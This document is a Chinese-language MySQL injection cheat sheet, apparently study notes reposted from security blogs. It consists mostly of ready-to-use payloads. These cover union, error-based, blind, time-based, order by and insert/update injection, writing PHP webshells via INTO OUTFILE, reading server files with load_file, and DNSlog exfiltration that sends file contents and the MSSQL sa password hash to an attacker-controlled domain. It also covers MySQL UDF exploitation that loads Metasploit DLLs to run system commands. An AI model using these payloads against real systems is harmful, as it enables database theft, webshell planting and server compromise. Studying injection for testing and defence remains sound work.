> 知识搬运工+一点点自己的东西

# 入门：Mysql注入天书

在线 http://www.cnblogs.com/lcamry/category/846064.html



![image-20200517093505891](assets/image-20200517093505891.png)



# Mysql注入

转载：https://syst1m.com/post/mysql-injection/#



SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。

> ##  学习要点
>
> - SQL 注入漏洞原理
> - SQL 注入漏洞对于数据安全的影响
> - SQL 注入漏洞的方法
> - 常见数据库的 SQL 查询语法
> - MSSQL,MYSQL,ORACLE 数据库的注入方法
> - SQL 注入漏洞的类型
> - SQL 注入漏洞修复和防范方法
> - 一些 SQL 注入漏洞检测工具的使用方法
>





## 函数

version()——MySQL 版本 

user()——数据库用户名 

database()——数据库名 

@@datadir——数据库路径 

@@version_compile_os——操作系统版本 

information_schema 自带数据库 

information_schema.schemata 数据库 

information_schema.tables 数据表 

information_schema.columns 数据列 

floor函数返回小于等于该值的最大整数 

RAND()函数调用可以在0和1之间产生一个随机数 

join(连接)

mid、from——返回一串字符select mid('password' from 1)——返回password

ascii——转化为ASCII





## 关键表名替换

innodb_index_stats 替换 information_schema

innodb_table_stats  



## 联合注入

```
union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=database()) --+
```

## 报错注入：

```
rand()
```



![img](assets/H06b4c10cffde4c4691f30bcdc4651954Y.jpg)



```
floor()
```



![img](assets/Hef6f531e82c0465590a5a78883dd4fc9K.jpg)



```
and (select 1 from (select count(*),concat((payload),floor (rand(0)*2))x from information_schema.tables group by x)a)

and (select count(*) from information_schema.tables group by concat(user(),floor(rand(0)*2))) -- +
1' and updatexml(1,user(),1) --+
只有在payload返回的不是xml格式才会生效,其最长输出32位
extractvalue(1,concat('~',user(),'~'))
其最长输出32位
```

### 简化

```
select count(*) from information_schema.tables group by concat(version(), floor(rand(0)*2))
```

### 关键表被禁用

```sql
select count(*) from (select 1 union select null union select !1)a group by concat(version(),floor(rand(0)*2))
```

### rand 禁用

```
select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)
```



### exp

```sql
select exp(~(select * FROM(SELECT USER())a))
```

### mysql重复性

```sql
select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
```



### UpdateXML

```sql
select updatexml(1,concat(0x2b,(version()),0x2b),1);
AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
```

### Extractvalue

Works with `MySQL >= 5.1`

```sql
?id=1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
```







### MySQL列名重复报错

- Example

  ```
  select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
  ```



![img](assets/Hc338c81da5b44512a8d83913d13de0abP.jpg)



- join函数爆列名

  ```
  select *  from(select * from users a join users b)c;
  ```



![img](assets/H8c2e81af91f444d9be000a9c77825fe1J.jpg)



```
select *  from(select * from users a join users b using(id))c;
```



![img](assets/Ha11dd656262249bc97ccf3e572bf7a60h.jpg)



- 爆数据

  ```
  select * from (select * from users a join users b using(id,username,password))c;
  ```



![img](assets/He4e632e6a2004cc8a33366706ade2d70g.jpg)



- 关于 join参考

> > [http://wxb.github.io/2016/12/15/MySQL%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8Djoin.html](http://wxb.github.io/2016/12/15/MySQL中的各种join.html)



### mysql大整数溢出报错注入



![img](assets/H6addec488706403da224e768cfb174028.jpg)



- 获取表名

  ```sql
  select !(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x)-~0
  ```

- 获取列名

  ```sql
  select !(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x)-~0;
  ```

- 检索数据

  ```sql
  !(select*from(select concat_ws(':',id, username, password) from users limit 0,1)x)-~0;
  ```

- 一次获取全部表与列

  ```sql
  select * from users where id = 1 | !(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)-~0
  
  (select(!x-~0)from(select(concat (@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat (@,0xa,table_name,0x3a3a,column_name)),@))x)a)
  
  (select!x-~0.from(select(concat (@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat (@,0xa,table_name,0x3a3a,column_name)),@))x)a)
  ```



![img](assets/Hd1abddb9c8ba4f59a89fc03c39f8dd67b.jpg)



> > https://osandamalith.com/2015/07/08/bigint-overflow-error-based-sql-injection/





## 布尔注入

```
left(database(),1)>'s'

截取数据库第一位
ascii(substr((select table_name information_schema.tables where tables_schema =database()limit 0,1),1,1))=101 --+
substr(a,b,c) 从b位置开始，截取字符串a的c长度
ascii() 将某个字符转为ascii值
ascii(substr(select database()),1,1)=98
ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))>98%23
mid(a,b,c) 从位置b开始，截取a字符长的c位
ord()同ascii()，将字符串转为ascii值
```

## regexp 正则注入

```
select user() regexp '^[a-z]';

select user() regexp '^ro'

I select * from users where id=1 and 1=(if((user() regexp '^r'),1,0));

select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^us[a-z]' limit 0,1);
```

## like 匹配注入

```
select user() like 'root%'
```

## 延时注入

```
If(ascii(substr(database(),1,1))>115,0,sleep(5))%23

UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘M SG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;
```

### sleep

### rpad+rlike

### benchmark

```sql
select * from table1 where 1=1 and if(mid(user(),1,1)='r',benchmark(10000000,sha1(1)),1) and cot(0);
或
select * from table1 where 1=1 and if(mid(user(),1,1)='r',concat(rpad(1,349525,'a'),rpad(1,349525,'a'),rpad(1,349525,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+asaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddasaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddasdasdasdasdasdasdasdasdasdasdasdadasdasdasdasdasdasdasdasdasdasdasd',1) and cot(0);
```



## 导入导出操作

```sql
load_file()导出文件

Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92, 114,101,112,97,105,114,92,115,97,109)))

-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105)) 
Explain:“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的 ASCII 代码
-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69) Explain:“c:/boot.ini”的 16 进制是“0x633a2f626f6f742e696e69”
-1 union select 1,1,1,load_file(c:\\boot.ini) Explain:路径里的/用 \\代替
```



## Mysql False注入（绕过登录和盲注）

==遇到引号闭合的变量时==

```
如果两个参数比较，有至少一个NULL，结果就是NULL，除了是用NULL<=>NULL 会返回1。不做类型转换
---------------------------------------------
两个参数都是字符串，按照字符串比较。不做类型转换
---------------------------------------------
两个参数都是整数，按照整数比较。不做类型转换
---------------------------------------------
如果不与数字进行比较，则将十六进制值视为二进制字符串。
---------------------------------------------
有一个参数是 TIMESTAMP 或 DATETIME，并且另外一个参数是常量，常量会被转换为时间戳
---------------------------------------------
有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较
---------------------------------------------
所有其他情况下，两个参数都会被转换为浮点数再进行比较
---------------------------------------------
最后那一句话很重要，说明如果我是字符串和数字比较，需要将字符串转为浮点数，这很明显会转换失败
```



![img](assets/Hd954de6df5e641a39cdcfa050f7215fdo.jpg)



### 算数运算

- - ```
    username= 'admin'+(payload)
    ```



![img](assets/H523d3e670d5f4d478d0aa8beedcd466fq.jpg)

\- -



```sql
username ='admin'--(payload)
```



![img](assets/Hdfa18fd2209742f0876b82770d7f8809i.jpg)

\- *



```sql
username ='1abc'* (payload)
```

- /

  ```sql
  username ='1abc'/ (payload)
  ```

  ```sql
  1’-(ascii(mid((passwd)from(n)))=m)-’ 
  
  正常的用法如下，对于str字符串，从pos作为索引值位置开始，返回截取len长度的子字符串
  
  MID(str,pos,len)
  这里的用法是，from(1)表示从第一个位置开始截取剩下的字符串，for(1)表示从改位置起一次就截取一个字符
  
  mid((str)from(i))
  mid((str)from(i)for(1))
  ```

### 位运算

- &

  ```sql
  username='1abc'&(payload)
  ```



![img](assets/H061891db89194f2cb36ec7f1792dbcc8u.jpg)



- | 或
- ^ 异或
- ‘<<0'>>0# 移位操作

\###逻辑运算 - <> 不等于

```
username='admin'<>(payload)
```

- = 等于

  ```sql
  username='admin'=(payload)
  ```

### 其他

```sql
'+1 is not null#  
'in(-1,1)#  
'not in(1,0)#  
'like 1#  
'REGEXP 1#  
'BETWEEN 1 AND 1#  
'div 1#  
'xor 1#  
'=round(0,1)='1  
'<>ifnull(1,2)='1
```



## Mysql 无列名注入

```sql
select * from users
```



![img](assets/Hc656c2e1dd0348dd96806231e537cbdfj.jpg)



```sql
select 1,2,3 union select * from users;
```



![img](assets/H7c76e69fb778415691ea95d325c2e513j.jpg)



```sql
select `2` from (select 1,2,3 union select * from users)redforce;
```



![img](assets/Hee222a2322e842c4824ece7eff8f97459.jpg)



```sql
select * from users where id=-1 union select 1,(select concat(`2`,0x3a,`3`) from (select 1,2,3 union select * from users)a limit 1,1),3;
```



![img](assets/H639f71bf43fd4ae4ac0adc2f334b18beF.jpg)



### 查询几个字段数目

```sql
select * from (select 1)a,(select 2)b,(select 3 )c union select * from users
```



## Mysql join注入（bypass逗号过滤）

达到与逗号一样的效果

```sql
article.php?id=0' union%0bselect * from (select 1)a join (select 2)b join (select 3)c join (select 4)d%23
```

可配合无列名注入获取数据，例题：第五届上海市大学生网络安全大赛



## Mysql order by 注入

### union 注入（通过排序查询到隐私数据）

```sql
 select * from users
```



![img](assets/Hbf916d7115744ff2aa40779d50203ae6o.jpg)



```sql
select * from users union select 1,2,3 order by 3
```



![img](assets/H92f72960280148b5969f9c7ed062ca158.jpg)



```sql
select * from users union select 1,2,'admin' order by 3
```



![img](assets/Hf8b6f976db9044a994034dd6eb80a16b9.jpg)



```sql
select * from users union select 1,2,'adminaa' order by 3
```



![img](assets/H89eb2047bb3b49cabdeb83b17b33515fq.jpg)



### if盲注

- 需要知道列名

  ```sql
  order by if(1=1,id,username)
  ```

- 不需要知道列名

  ```sql
  order by if(表达式,1,(select id from information_schema.tables))
  ```

==如果表达式为false时，sql语句会报ERROR 1242 (21000): Subquery returns more than 1 row的错误，导致查询内容为空，如果表达式为true是，则会返回正常的页面。==

### 基于时间的盲注

```sql
order by if(1=1,1,sleep(1))
```

### 基于rand()的盲注

```sql
select * from ha order by rand(true)
```

mysql> select * from ha order by rand(true); +—-+——+ | id | name | +—-+——+ | 9 | NULL | | 6 | NULL | | 5 | NULL | | 1 | dss | | 0 | dasd | +—-+——+ mysql> select * from ha order by rand(false); +—-+——+ | id | name | +—-+——+ | 1 | dss | | 6 | NULL | | 0 | dasd | | 5 | NULL | | 9 | NULL | +—-+——+

```sql
order by rand(ascii(mid((select database()),1,1))>96)
```

### 步骤

- 判断

  ```
  http://192.168.239.2:81/?order=IF(1=1,name,price) 通过name字段排序
  http://192.168.239.2:81/?order=IF(1=2,name,price) 通过price字段排序
  /?order=(CASE+WHEN+(1=1)+THEN+name+ELSE+price+END) 通过name字段排序
  /?order=(CASE+WHEN+(1=1)+THEN+name+ELSE+price+END) 通过price字段排序
  http://192.168.239.2:81/?order=IFNULL(NULL,price) 通过name字段排序
  http://192.168.239.2:81/?order=IFNULL(NULL,name) 通过price字段排序
  可以观测到排序的结果不一样
  
  http://192.168.239.2:81/?order=rand(1=1) 
  http://192.168.239.2:81/?order=rand(1=2)
  ```

  ```
  /?order=(select+1+regexp+if(substring((select+concat(table_name)from+information_schema.tables+where+table_schema%3ddatabase()+limit+0,1),1,1)=0x67,1,0x00))  正确
  /?order=(select+1+regexp+if(substring((select+concat(table_name)from+information_schema.tables+where+table_schema%3ddatabase()+limit+0,1),1,1)=0x66,1,0x00)) 错误
  ```

**regexp 用前面的1和后面的返回结果比较**

> > https://www.cnblogs.com/icez/p/Mysql-Order-By-Injection-Summary.html

## limit 注入

### 不存在order by 关键字

```sql
select id from users limit 0,1
```



![img](assets/Hdd54f086a82b4fe9b8f442f083fae738k.jpg)



```sql
select id from users limit 0,1 union select username from users;
```



![img](assets/He5036eef04164ef38d83d2b95b3186afJ.jpg)



### 存在 order by 关键字（无法使用union select）



![img](assets/H77658e82a26349239eb92e51c28b1f16d.jpg)



**此方法适用于5.0.0< MySQL <5.6.6版本**

```
PROCEDURE函数
```

- 报错注入

  ```sql
  select id from users order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
  ```



![img](assets/H58f5c6058f644d28b34a17e3a4b97189e.jpg)



- 延时注入

  ```sql
  select * from admin where id >0 order by id limit 0,1 PROCEDURE analyse(extractvalue(rand(),concat(0x3a,(if(1=1,benchmark(2000000,md5(404)),1)))),1);
  ```



## 报错注入邂逅load_file&into outfile搭讪LINES

```sql
FIELDS TERMINATED BY原理为在输出数据的每个字段之间插入webshell内容，所以如果select返回的只有一个字段，则写入的文件不包含webshell内容,例如下面语句SELECT username FROM user WHERE id = 1 into outfile 'D:/1.php' FIELDS TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e，写入的文件中只包含username的值而没有webshell内容;

LINES TERMINATED BY和LINES STARTING BY原理为在输出每条记录的结尾或开始处插入webshell内容，所以即使只查询一个字段也可以写入webshell内容，更为通用。此外，该类方式可以引用于limit等不能union的语句之后进行写文件操作。
```



### into outfile 写文件

- union写文件（0x3c3f70687020706870696e666f28293b3f3e = <?php phpinfo();?>）

  ```sql
  SELECT * FROM user WHERE id = -1 union select 1,2,0x3c3f70687020706870696e666f28293b3f3e into outfile 'D:/1.php'
  ```

- FIELDS TERMINATED BY（可在limit等语句后）

  ```sql
  SELECT * FROM user WHERE id = 1 into outfile 'D:/1.php' fields terminated by 0x3c3f70687020706870696e666f28293b3f3e
  ```

- LINES TERMINATED BY（可用于limit等sql注入）

  ```sql
  SELECT username FROM user WHERE id = 1 into outfile 'D:/1.php' LINES TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e
  ```

- LINES STARTING BY（可用于limit等sql注入）

  ```sql
  SELECT username FROM user WHERE id = 1 into outfile 'D:/2.php' LINES STARTING  BY 0x3c3f70687020706870696e666f28293b3f3e
  ```

### Load_file 读文件

- 联合注入+load_file读文件

  ```sql
  SELECT * FROM user WHERE id=-1 UNION select 1,'1',(select load_file('D:/1.php'))
  ```

- DNSLOG带外查询

  ```sql
  SELECT id FROM user WHERE id = load_file (concat('\\\\',hex((select load_file('D:/1.php'))),'.t00ls.xxxxxxxxx.tu4.org\\a.txt'))
  ```

- 报错注入+load_file读文件

  ```sql
  select * from user  where username = '' and updatexml(0,concat(0x7e,(LOAD_FILE('D:/1.php')),0x7e),0)
  
  select * from user where id=1 and (extractvalue(1,concat(0x7e,(select (LOAD_FILE('D:/1.php'))),0x7e)))
  ```



### 扫描文件是否存在

**load_file读取文件时，如果没有对应的权限获取或者文件不存在则函数返回NULL,所以结合isnull+load_file可以扫描判断文件名是否存在**

- 如果文件存在，isnull(load_file(‘文件名’))返回0

  ```
  mysql> select * from user  where username = '' and updatexml(0,concat(0x7e,isnull(LOAD_FILE('D:/1.php')),0x7e),0);
  ERROR 1105 (HY000): XPATH syntax error: '~0~'
  ```

- 如果文件不存在isnull(load_file(‘文件名’))返回1

  ```
  mysql> select * from user  where username = '' and updatexml(0,concat(0x7e,isnull(LOAD_FILE('D:/xxxxx')),0x7e),0);
  ERROR 1105 (HY000): XPATH syntax error: '~1~'
  ```

### 另类写文件

```sql
SELECT ... INTO DUMPFILE'file_path'
```

## 笛卡尔积延时注入

```sql
SELECT count(*) FROM information_schema.columns A;
```



![img](assets/H09e769a89c554836b70373d8130134dcz.jpg)



```sql
SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C;
```



![img](assets/H9f13bf0489a44c8082990a77ec0c2f860.jpg)



## Insert、update注入新思路



![img](assets/H114a5a2796b24ecc8b1c1c4dccf67ba9d.jpg)





![img](assets/H9fc23bdd0b5844c5a41c58e5fed8bd04z.jpg)





![img](assets/H4ec8fc2b48de4ee7bf8cf45799d7094cU.jpg)





![img](assets/H256914b5da104dd389f6ce29272ea01cc.jpg)

\- 字符串《==》数字



```sql
conv() 进制转换
```



![img](assets/H6b4a6c0c17d74944a2bf8a056538ec50d.jpg)



- 获取的数据超过8个字节

  ```sql
  select conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)), 16, 10);
  ```



![img](assets/H044f3ecd33044adaaa3f383b63b5a8c6u.jpg)



- 获取表名

  ```sql
  select conv(hex(substr((select table_name from information_schema.tables where table_schema=schema() limit 0,1),1 + (n-1) * 8, 8*n)), 16, 10);
  ```



![img](assets/Hf9f39a2e0b7747ecb685de22873634943.jpg)



- 获取列名

  ```sql
  select conv(hex(substr((select column_name from information_schema.columns where table_name=’Name of your table’ limit 0,1),1 + (n-1) * 8, 8*n)), 16, 10);
  ```

- 利用update语句

  ```sql
  update users set username = 'test' | conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)), 16, 10) where id =16
  ```

- 利用 INSERT语句

  ```sql
  insert into users values (17,'james', 'bond');
  ```

  ```sql
  insert into users values (17,'james', 'bond'|conv(hex(substr(user(),1 + (n-1) * 8, 8* n)),16, 10);
  ```

- Mysql 5.7中的限制

  ```sql
  update users set username = '0' | conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)), 16, 10) where id =16
  ```

- 编码解码

  ```sql
  conv(hex(value, 16, 10)
  ```

  ```sql
  select unhex(conv(value, 10, 16));
  ```

> > 

## MD5哈希注入

- 代码中语句

  ```
  $sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";
  ```

**如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。**

```
ffifdyop    --> 'or'

esvh        --> '='

129581926211651571912466741651878684928 --> 'or'
```

> > https://bbs.ichunqiu.com/article-1766-1.html

## show columns 注入

- php代码

  ```
  mysql_query("show columns from `shop_{$table}`") or die("show coulumns 出错:".mysql_error());
  show columns 
  ```



![img](assets/H47673f9ce5214b6794f8a3f52cf6885aE.jpg)



- 注入

  ```
  table=123` where updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)#
  ```



![img](assets/H47673f9ce5214b6794f8a3f52cf6885aE.jpg)



## MySQL数据库的Innodb引擎的注入

**当目标程序过滤了关键字,如information,在注入时,使用select database()关键字查询出当前库名后,无法通过查询information_schema.tables表查询当前库的表名**

- Innodb 的表

  ```
  mysql.innodb_table_stats
  mysql.innodb_index_stats
  ```

- 字段

  ```
  database_name ， table_name 
  ```

- 例子：

  ```
  group_concat(table_name) from mysql.innodb_table_stats where database_name =database() #
  ```

## Mysql约束攻击

- 参考

> > [http://www.goodwaf.com/2016/12/30/%E5%9F%BA%E4%BA%8E%E7%BA%A6%E6%9D%9F%E6%9D%A1%E4%BB%B6%E7%9A%84SQL%E6%94%BB%E5%87%BB/](http://www.goodwaf.com/2016/12/30/基于约束条件的SQL攻击/)

- 条件限制

  ```
  服务端没有对用户名长度进行限制
  登陆验证的SQL语句必须是用户名和密码一起验证
  验证成功后返回的必须是用户传递进来的用户名，而不是从数据库取出的用户名
  ```

- 攻击原理

  ```
  INSERT截断:当设计一个字段时，我们都必须对其设定一个最大长度，比如CHAR(10)，VARCHAR(20)等等。但是当实际插入数据的长度超过限制时，数据库就会将其进行截断，只保留限定的长度。
  ```

  ```
  在数据库对字符串进行比较时，如果两个字符串的长度不一样，则会将较短的字符串末尾填充空格，使两个字符串的长度一致，比如，字符串A:[String]和字符串B:[String2]进行比较时，由于String2比String多了一个字符串，这时MySQL会将字符串A填充为[String ]，即在原来字符串后面加了一个空格，使两个字符串长度一致。
  ```

- 服务端代码

  ```
  <?php
  $username = mysql_real_escape_string($_GET['username']);
  $password = mysql_real_escape_string($_GET['password']);
  $query = "SELECT username FROM users
        WHERE username='$username'
            AND password='$password' ";
  $res = mysql_query($query, $database);
  if($res) {
  if(mysql_num_rows($res) > 0){
    return $username;//此处较原文有改动
  }
  }
  return Null;
  ?>
  ```

- 攻击

  ```
  注册一个[Dumb          done]的用户
  ```



## MySQL UDF Exploitation

> > https://osandamalith.com/2018/02/11/mysql-udf-exploitation/

```sql
select host, user, password from mysql.user;
```



![img](assets/H1c9d1a119ac74ac9b717c68f51c39e32g.jpg)



```
select * from mysql.user where user = substring_index(user(), '@', 1) ;
```



![img](assets/H35f812e965b942b9b16a989feea063dbw.jpg)



- dll下载地址

  ```
  https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql
  ```

- 获取当前操作系统以及数据库架构情况

  ```
  select @@version_compile_os, @@version_compile_machine
  
  show variables like '%compile%';
  ```



![img](assets/H30985732ca5b411aa9bb4040986853d3S.jpg)



- 查找plugin文件夹

**MySQL 5.0.67以后udf.dll必须位于plugin文件夹**

```
select @@plugin_dir ;
show variables like 'plugin%';
```



![img](assets/Hebbbdd52841e4b1e800770ad9e381e8fW.jpg)



- 旧版本可以使用目录

  ```
  @@datadir
  @@basedir\bin
  C:\windows
  C:\windows\system
  C:\windows\system32
  ```

### 上传二进制文件

- 网络共享

  ```
  select load_file('\\\\192.168.0.19\\network\\lib_mysqludf_sys_64.dll') into dumpfile "D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll";
  ```

- 十六进制编码

  ```
  select hex(load_file('/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll')) into dumpfile '/tmp/udf.hex';
  
  select 0x4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000000000000000000000… into dump file "D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll";
  ```

- 创建表拼接

  ```
  create table temp(data longblob);
  
  insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);
  
  update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000);
  
  select data from temp into dump file "D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll";
  ```

- MySQL 5.6.1/MariaDB 10.0.5

**to_base64和from_base64函数**

```
select to_base64(load_file('/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll')) 
into dumpfile '/tmp/udf.b64';
```

**编辑base64文件并通过以下方式将其dump到插件目录**

```
select from_base64("TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v
ZGUuDQ0KJAAAAAAAAAAzwu3gd6ODs3ejg7N3o4OzafEQs3Wjg7Np8QCzfaODs2nxB7N1o4OzUGX4
s3Sjg7N3o4KzW6ODs2nxCrN2o4OzafEWs3Wjg7Np8RGzdqODs2nxErN2o4OzUmljaHejg7MAAAAA
AAAAAAAAAAAAAAAAUEUAAGSGBgBwsYNLAAAAAAAAAADwACIgCwIJAAASAAAAFgAAAAAAADQaAAAA
EAAAAAAAgAEAAAAAEAAAAAIAAAUAAgAAAAAABQACAAAAAAAAgAAAAAQAADPOAAACAEABAAAQAAAA
AAAAEAAAAAAAAAAAEAAAAAAAABAAAAAAAAAAAAAAEAAAAAA5AAAFAgAAQDQAADwAAAAAYAAAsAIA
AABQAABoAQAAAAAAAAAAAAAAcAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAwAABwAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAAAR
EAAAABAAAAASAAAABAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAABQsAAAAwAAAADAAAABYAAAAA") 
into dumpfile "D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll";
```



### DLL使用

- 查找到mysql的目录

  ```
  select @@basedir;
  ```

- 创建文件夹（没测试成功）

  ```
  select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION';    //利用NTFS ADS创建lib目录
   
  select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION';    //利用NTFS ADS创建plugin目录
  ```

- 改变plugin目录位置

  ```
  mysqld.exe –plugin-dir=C:\\temp\\plugins\\
  ```

- 上传dll



![img](assets/H584c9e7e2eae4110be942b8adfb9de7ba.jpg)



- 安装

  ```
  create function sys_exec returns int soname 'udf.dll';
  ```

- 验证

  ```
  select * from mysql.func where name = 'sys_exec';
  ```



![img](assets/H4686105bc9b24c8dbbca57ca744a9ec4W.jpg)



- 删除

  ```
  drop function sys_exec;
  ```

- 执行

  ```
  select sys_exec('cmd');
  ```



![img](assets/H35996863ea5f4319930172b9924440f4D.jpg)





# DNSlog带外

参考资料：

- [利用DNS实现SQL注入带外查询](http://www.secwk.com/2019/10/13/10559/)

- [SQL注入之利用DNSlog外带盲注回显](https://baynk.blog.csdn.net/article/details/105214129)

- [sql注入——dns的带外注入](https://blog.csdn.net/cxrpty/article/details/104255459)

- [Dnslog在SQL注入中的实战](https://www.anquanke.com/post/id/98096)

  

## 原理



![img](assets/t01a278167ad3a008db.jpg)

作为攻击者，提交注入语句，让数据库把需要查询的值和域名拼接起来，然后发生DNS查询，我们只要能获得DNS的日志，就得到了想要的值。所以我们需要有一个自己的域名，然后在域名商处配置一条NS记录，然后我们在NS服务器上面获取DNS日志即可。





当我们发现一个站点存在一个没有数据回显的注入点进行注入时，只能采取盲注，这种注入速度非常慢，需要一个一个字符猜解，而且很容易被网站BAN掉IP，虽然也可以使用代理IP池，但是还是需要一种快速有效的方法来获取数据。

此时我们就可以利用DNSlog来快速的获取数据，当然我们也可以在无回显的命令执行或者无回显的SSRF中利用。



### DNSlog利用条件

DBMS中需要有可用的，能直接或间接引发DNS解析过程的子程序，即使用到UNC
**Linux没有UNC路径，所以当处于Linux系统时，不能使用该方式获取数据**
前人总结不同DBMS中使用的方法：



**Microsoft SQL Server**

master…xp_dirtree (用于获取所有文件夹的列表和给定文件夹内部的子文件夹）

master…xp_fileexist (用于确定一个特定的文件是否存在于硬盘)

master…xp_subdirs (用于得到给定的文件夹内的文件夹列表)

```sql
DECLARE @host varchar(1024);

SELECT @host=(SELECT TOP 1master.dbo.fn_varbintohexstr(password_hash)FROM sys.sql_loginsWHERE name='sa')+'.ip.port.b182oj.ceye.io';

EXEC('master..xp_dirtree"\'+@host+'\foobar$"');
```



Oracle

Oracle的利用方式就太多了，因为Oracle能够发起网络请求的模块是很很多的。

